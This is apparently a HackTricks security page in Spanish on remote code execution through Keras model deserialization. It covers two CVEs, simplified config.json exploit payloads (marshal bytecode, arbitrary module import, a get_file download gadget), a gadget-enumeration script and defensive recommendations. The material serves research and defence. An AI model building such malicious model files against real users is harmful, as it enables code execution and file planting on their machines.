# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas de explotación prácticas contra el pipeline de deserialización de modelos Keras, explica los detalles internos del formato .keras y la superficie de ataque, y proporciona un conjunto de herramientas para investigadores para encontrar Vulnerabilidades en Archivos de Modelo (MFVs) y gadgets post-fix.

## Detalles internos del formato .keras

Un archivo .keras es un archivo ZIP que contiene al menos:
- metadata.json – información genérica (por ejemplo, versión de Keras)
- config.json – arquitectura del modelo (superficie de ataque principal)
- model.weights.h5 – pesos en HDF5

El config.json impulsa la deserialización recursiva: Keras importa módulos, resuelve clases/funciones y reconstruye capas/objetos a partir de diccionarios controlados por el atacante.

Ejemplo de fragmento para un objeto de capa Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialización realiza:
- Importación de módulos y resolución de símbolos a partir de claves module/class_name
- invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activaciones, inicializadores, restricciones, etc.)

Históricamente, esto expuso tres primitivas a un atacante que crea config.json:
- Control de qué módulos se importan
- Control de qué clases/funciones se resuelven
- Control de kwargs pasados a constructores/from_config

## CVE-2024-3660 – RCE de bytecode de capa Lambda

Causa raíz:
- Lambda.from_config() utilizó python_utils.func_load(...) que decodifica en base64 y llama a marshal.loads() en bytes del atacante; la deserialización de Python puede ejecutar código.

Idea de explotación (payload simplificado en config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigación:
- Keras aplica safe_mode=True por defecto. Las funciones de Python serializadas en Lambda están bloqueadas a menos que un usuario opte explícitamente por desactivarlo con safe_mode=False.

Notas:
- Los formatos heredados (guardados en HDF5 más antiguos) o bases de código más antiguas pueden no aplicar verificaciones modernas, por lo que los ataques de estilo "downgrade" aún pueden aplicarse cuando las víctimas utilizan cargadores más antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras ≤ 3.8

Causa raíz:
- _retrieve_class_or_fn utilizó importlib.import_module() sin restricciones con cadenas de módulo controladas por el atacante desde config.json.
- Impacto: Importación arbitraria de cualquier módulo instalado (o módulo plantado por el atacante en sys.path). El código se ejecuta en el momento de la importación, luego se produce la construcción del objeto con kwargs del atacante.

Idea de explotación:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Mejoras de seguridad (Keras ≥ 3.9):
- Lista blanca de módulos: importaciones restringidas a módulos del ecosistema oficial: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro por defecto: safe_mode=True bloquea la carga de funciones serializadas de Lambda no seguras
- Comprobación de tipos básica: los objetos deserializados deben coincidir con los tipos esperados

## Superficie de gadgets post-arreglo dentro de la lista blanca

Incluso con la lista blanca y el modo seguro, permanece una amplia superficie entre los llamados permitidos de Keras. Por ejemplo, keras.utils.get_file puede descargar URLs arbitrarias a ubicaciones seleccionables por el usuario.

Gadget a través de Lambda que hace referencia a una función permitida (no código byte de Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitación importante:
- Lambda.call() antepone el tensor de entrada como el primer argumento posicional al invocar el callable objetivo. Los gadgets elegidos deben tolerar un argumento posicional extra (o aceptar *args/**kwargs). Esto limita qué funciones son viables.

Impactos potenciales de los gadgets permitidos:
- Descarga/escritura arbitraria (plantación de rutas, envenenamiento de configuración)
- Llamadas de red/efectos similares a SSRF dependiendo del entorno
- Encadenamiento a la ejecución de código si las rutas escritas son importadas/ejecutadas más tarde o añadidas a PYTHONPATH, o si existe una ubicación de ejecución-escritura escribible

## Kit de herramientas del investigador

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumerar los callables candidatos en keras, keras_nlp, keras_cv, keras_hub y priorizar aquellos con efectos secundarios de archivo/red/proceso/entorno.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Pruebas de deserialización directa (no se necesita archivo .keras)

Alimente diccionarios elaborados directamente en los deserializadores de Keras para conocer los parámetros aceptados y observar los efectos secundarios.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondeo y formatos entre versiones

Keras existe en múltiples bases de código/épocas con diferentes salvaguardias y formatos:
- Keras integrado en TensorFlow: tensorflow/python/keras (legado, programado para eliminación)
- tf-keras: mantenido por separado
- Keras 3 de múltiples backends (oficial): introdujo .keras nativo

Repita pruebas a través de bases de código y formatos (.keras vs HDF5 legado) para descubrir regresiones o salvaguardias faltantes.

## Recomendaciones defensivas

- Trate los archivos de modelo como entrada no confiable. Cargue modelos solo de fuentes confiables.
- Mantenga Keras actualizado; use Keras ≥ 3.9 para beneficiarse de la lista blanca y las verificaciones de tipo.
- No establezca safe_mode=False al cargar modelos a menos que confíe completamente en el archivo.
- Considere ejecutar la deserialización en un entorno aislado, con privilegios mínimos, sin salida de red y con acceso restringido al sistema de archivos.
- Haga cumplir listas blancas/firmas para fuentes de modelos y verificación de integridad cuando sea posible.

## Referencias

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
